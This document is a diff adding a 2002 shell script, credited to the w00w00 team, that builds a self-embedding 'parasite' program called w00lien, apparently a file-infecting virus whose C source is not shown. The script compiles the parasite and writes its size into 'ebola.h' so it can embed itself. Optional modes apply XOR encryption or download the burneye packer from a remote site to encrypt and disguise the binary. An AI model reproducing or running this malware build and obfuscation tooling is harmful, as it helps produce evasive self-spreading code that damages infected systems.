@@ -1,0 +1,143 @@
+# Copyright (C) 2002 w00w00 Security Development (WSD)
+#                         - w00(a)lien getalive script
+#
+# If you want to make any changes just make them ;)
+# Use it with care, it is ALIVE hehe ;) 
+#
+
+
+## Our SINGLE mode function ##
+function single_mode()
+{
+echo "   SINGLE mode, enabled!..."
+echo
+echo -n " [-] Step 1 : Compiling w00lien..."
+gcc w00lien.c -o w00lien -O2 -DSINGLE	
+echo "Done!"
+
+echo -n " [-] Step 2 : Check parasite size..."	
+SIZE=`ls -la w00lien | awk -F ' ' '{print $5}'`
+echo "$SIZE"
+
+echo -n " [-] Step 3 : Correct filesize..."
+echo "#define PARASIZE $SIZE" > ebola.h
+echo "Done!"
+
+echo -n " [-] Step 4 : Recompiling w00lien..."
+gcc w00lien.c -o w00lien -O2 -DSINGLE
+echo "Done!"
+
+echo 
+echo "  oh! my GOD IT'S ALIVE!! haha ;)"
+echo 
+}
+
+
+## Our SILENT mode function!! ##
+function silent_mode()
+{
+echo "   SILENT mode, enabled!..."
+echo
+echo -n " [-] Step 1 : Compiling w00lien..."
+gcc w00lien.c -o w00lien -O2 -DSILENT
+echo "Done!"
+ 
+echo -n " [-] Step 2 : Check parasite size..."
+SIZE=`ls -la w00lien | awk -F ' ' '{print $5}'`
+echo "$SIZE"
+ 
+echo -n " [-] Step 3 : Correct filesize..."
+echo "#define PARASIZE $SIZE" > ebola.h
+echo "Done!"
+ 
+echo -n " [-] Step 4 : Recompiling w00lien..."
+gcc w00lien.c -o w00lien -O2 -DSILENT
+echo "Done!"
+ 
+echo
+echo "  oh! my GOD IT'S ALIVE!! haha ;)"
+echo
+
+}
+
+
+## Our SMART mode function ##
+function smart_mode()
+{
+echo "   SMART mode, enabled!..."
+echo
+echo -n " [-] Step 1 : Compiling w00lien..."
+gcc w00lien.c -o w00lien -O2
+echo "Done!"
+ 
+echo " [-] Step 2 : Check for burneye-1.0 main dir..."
+if test ! -d burneye-1.0; then
+{
+    echo " [-] SubStep 1 : Downloading burneye-1.0 from teso site..."
+    /usr/bin/wget http://www.team-teso.net/releases/burneye-1.0-linux-static.tar.gz
+    tar xfvz burneye-1.0-linux-static.tar.gz > k ; rm -rf k
+}
+fi
+
+echo " [-] Step 3 : Encrypt our parasite..."  
+burneye-1.0/burneye -o w00 w00lien
+mv w00 w00lien
+
+echo -n " [-] Step 4 : Check parasite size..."
+SIZE=`ls -la w00lien | awk -F ' ' '{print $5}'`
+echo "$SIZE"
+ 
+echo -n " [-] Step 5 : Correct filesize..."
+echo "#define PARASIZE $SIZE" > ebola.h
+echo "Done!"
+ 
+echo -n " [-] Step 6 : Recompiling w00lien..."
+gcc w00lien.c -o w00lien -O2 -DSINGLE
+echo "Done!"
+ 
+echo " [-] Step 7 : Encrypt our parasite..."
+burneye-1.0/burneye -o w00 w00lien
+mv w00 w00lien
+
+echo
+echo "  oh! my GOD IT'S ALIVE!! haha ;)"
+echo
+}
+
+
+
+echo
+echo "-=-  Welcome to the other side... -=-"
+echo "  w00lien v0.0.3 by w00w00 Team 2002 "
+echo
+
+
+if [ "$#" -ne 1 ]
+    then
+         echo " Usage : $0 <mode> "
+         echo 
+         echo " single     -     single mode, no encryption."
+         echo " silent     -     silent mode, x0r encryption."
+         echo " smart      -     smart  mode, be-1.0 encryption."     
+         echo
+exit
+fi
+
+
+if [ $1 = "single" ]
+            then
+                 single_mode
+            exit
+fi
+
+if [ $1 = "silent" ]
+            then
+                 silent_mode
+            exit
+fi
+
+if [ $1 = "smart" ]
+            then
+                 smart_mode
+            exit
+fi
